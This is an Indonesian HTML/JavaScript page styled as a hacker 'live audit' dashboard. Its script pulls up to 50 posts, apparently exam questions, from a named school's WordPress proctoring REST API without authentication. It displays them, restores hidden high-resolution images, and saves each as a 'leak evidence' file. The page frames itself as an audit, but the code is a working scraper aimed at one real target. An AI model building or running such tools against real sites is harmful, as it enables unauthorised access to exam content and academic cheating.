<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LIVE AUDIT - SMKN 1 SRAGI</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        /* TEMA HACKER (HIJAU NEON) */
        body { 
            background-color: #000000; 
            color: #00ff00; 
            font-family: 'Courier New', Courier, monospace; 
            overflow: hidden; 
        }
        
        /* Kotak Utama */
        .card { 
            background-color: #050505; 
            border: 1px solid #004400; 
            margin-bottom: 15px; 
        }
        
        .card-header { 
            border-bottom: 1px dashed #005500; 
            color: #00ff00; 
            font-weight: bold; 
            background-color: #020202;
        }

        /* Link di Sidebar Kiri */
        a.soal-link { 
            color: #00cc00; 
            text-decoration: none; 
            display: block; 
            padding: 8px 5px; 
            border-bottom: 1px solid #002200; 
            transition: 0.2s;
        }
        a.soal-link:hover { 
            background-color: #003300; 
            color: #ffffff; 
            padding-left: 10px; 
            cursor: pointer;
        }

        /* Area Scroll */
        .scrollable-area {
            height: 75vh; 
            overflow-y: auto;
            padding-right: 10px;
        }

        /* Scrollbar Keren */
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: #000000; }
        ::-webkit-scrollbar-thumb { background: #005500; border-radius: 10px; }
        ::-webkit-scrollbar-thumb:hover { background: #00ff00; }

        .indikator { color: #00ff00; font-weight: bold; }
        
        /* Gambar di dalam soal */
        img { max-width: 100%; height: auto; border: 1px solid #004400; margin: 10px 0; }
    </style>
</head>
<body>

<div class="container-fluid mt-4 px-4">
    <div class="d-flex justify-content-between align-items-center mb-4 border-bottom border-secondary pb-2">
        <h2><span class="indikator">>_ SYSTEM AUDIT</span>: SMKN 1 SRAGI</h2>
        <div class="text-end">
            <span class="indikator" style="border: 1px solid #00ff00; padding: 3px 8px;">REST API: VULNERABLE</span><br>
            <small id="last-update" style="color: #008800;">Menghubungkan...</small>
        </div>
    </div>

    <div class="row">
        <div class="col-md-4">
            <div class="card">
                <div class="card-header">> DATABASE_INDEX</div>
                <div class="card-body scrollable-area">
                    <ul id="daftar-soal" class="list-unstyled mb-0">
                        <li class="text-center mt-3">Sedang menyedot data...</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="col-md-8">
            <div class="card">
                <div class="card-header">> DOCUMENT_VIEWER</div>
                <div class="card-body scrollable-area" id="tempat-soal">
                    <div class="text-center mt-5">
                        <p>> Silakan pilih soal di menu kiri...</p>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    // 🔥 LINK DARI LU UDAH MASUK SINI 🔥
    const urlApiBocor = "https://proktor.smkn1sragi.test.co.id/wp-json/wp/v2/posts"; 

    // FUNGSI: Download Bukti HTML
    function downloadSoal(idSoal, judulSoal, index) {
        let kontenSoal = document.getElementById(`konten-soal-${index}`).innerHTML;
        
        // Template File Bukti (Background Putih biar resmi)
        let templateHTML = `
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="utf-8">
            <title>BUKTI KEBOCORAN: ${judulSoal}</title>
            <style>
                body { font-family: Arial, sans-serif; padding: 40px; background-color: #fff; color: #000; }
                .header { border-bottom: 3px solid red; padding-bottom: 20px; margin-bottom: 30px; }
                h1 { color: red; margin: 0; }
                .meta { background: #f0f0f0; padding: 10px; margin-bottom: 20px; border: 1px solid #ccc; }
                img { max-width: 100%; height: auto; display: block; margin: 20px 0; }
            </style>
        </head>
        <body>
            <div class="header">
                <h1>🚨 LAPORAN KEBOCORAN DATA</h1>
                <p>Data ini diambil dari akses publik REST API tanpa autentikasi.</p>
            </div>
            <div class="meta">
                <strong>ID Database:</strong> ${idSoal}<br>
                <strong>Judul File:</strong> ${judulSoal}<br>
                <strong>URL Sumber:</strong> ${urlApiBocor}/${idSoal}
            </div>
            <div class="content">
                ${kontenSoal}
            </div>
        </body>
        </html>`;

        // Proses Download
        let blob = new Blob([templateHTML], { type: 'text/html' });
        let link = document.createElement('a');
        link.href = window.URL.createObjectURL(blob);
        let namaFile = judulSoal.replace(/[^a-z0-9]/gi, '_').toLowerCase();
        link.download = `EVIDENCE_${idSoal}_${namaFile}.html`;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    }

    async function tarikDataRealTime() {
        try {
            // Tambahin parameter per_page=100 biar narik banyak soal sekaligus
            const response = await fetch(urlApiBocor + "?per_page=50");
            const dataSoal = await response.json();
            
            let listHTML = "";
            let soalHTML = "";

            dataSoal.forEach((soal, index) => {
                let judul = soal.title ? soal.title.rendered : "Tanpa Judul";
                let isi = soal.content ? soal.content.rendered : "Konten tidak terbaca";
                let judulAman = judul.replace(/'/g, "\\'").replace(/"/g, "&quot;");

                // -- JURUS ANTI BLUR (GAMBAR HD) --
                let wadah = document.createElement('div');
                wadah.innerHTML = isi;
                let imgs = wadah.getElementsByTagName('img');
                for (let img of imgs) {
                    let srcAsli = img.getAttribute('data-src') || img.getAttribute('data-lazy-src');
                    if (srcAsli) {
                        img.setAttribute('src', srcAsli);
                        img.style.opacity = '1';
                        img.removeAttribute('srcset'); // Hapus srcset biar gak bingung
                    }
                }
                isi = wadah.innerHTML;
                // ----------------------------------

                // List Kiri
                listHTML += `
                    <li>
                        <a href="#soal-${index}" class="soal-link">
                            > [ID:${soal.id}] ${judul}
                        </a>
                    </li>`;
                
                // Isi Kanan + Tombol Download
                soalHTML += `
                    <div id="soal-${index}" class="mb-5 pb-4 border-bottom border-secondary">
                        <div class="d-flex justify-content-between align-items-center mb-3">
                            <h4 class="text-success m-0">[ID:${soal.id}] ${judul}</h4>
                            <button onclick="downloadSoal('${soal.id}', '${judulAman}', ${index})" 
                                class="btn btn-sm btn-outline-success fw-bold" style="border-radius: 0;">
                                [v] DOWNLOAD BUKTI
                            </button>
                        </div>
                        <div id="konten-soal-${index}" class="p-3" style="background: #111; border: 1px dashed #333;">
                            ${isi}
                        </div>
                    </div>`;
            });

            document.getElementById('daftar-soal').innerHTML = listHTML;
            document.getElementById('tempat-soal').innerHTML = soalHTML;
            
            let jam = new Date().toLocaleTimeString('id-ID');
            document.getElementById('last-update').innerText = "Terhubung: " + jam;

        } catch (error) {
            console.error(error);
            document.getElementById('last-update').innerText = "❌ GAGAL KONEK: " + error;
        }
    }

    // Jalankan
    tarikDataRealTime();

</script>
</body>
</html>
